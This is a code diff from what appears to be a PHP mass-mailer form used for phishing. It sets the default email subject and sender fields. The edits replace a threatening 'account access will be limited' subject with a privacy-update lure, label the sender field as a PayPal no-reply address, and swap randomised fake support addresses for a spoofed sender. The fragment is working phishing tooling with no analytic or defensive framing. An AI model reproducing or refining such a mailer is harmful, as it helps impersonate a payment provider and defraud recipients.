@@ -314,14 +314,14 @@ exit;}
  <? $subject = "subject"; ?>
 <span style="font-size:13px;color:#ffffff;"><? echo $subject ?></span>
 
-			<input name="sub" type="text" value="Your account access will be limited in 24h." class="highlight highlight-source-json" 
+			<input name="sub" type="text" value="Updates to our Privacy Statement" class="highlight highlight-source-json" 
 			id="sub" style="border-radius: 15px; width:100%" placeholder="Subject">
   <? $Email = "Email"; ?>			
 <span style="font-size:13px;color:#ffffff;"><? echo $Email ?></span>
 
-			<input name="Service" type="text" value="<?php 
+			<input name="noreply@paypal.com" type="text" value="<?php 
 echo "noreply-".$RandomMail."".$RandomMail.""; 
-echo '-Service@'; echo ''.$RandomMail2.'-Support.com';  # eg result: -Service@Random.com
+echo 'noreply@care.com';  # eg result: -Service@Random.com
 ?>" class="highlight highlight-source-json" id="Service" style="border-radius: 15px; width:100%" placeholder="Email">
 
   <? $Letter = "Letter"; ?>
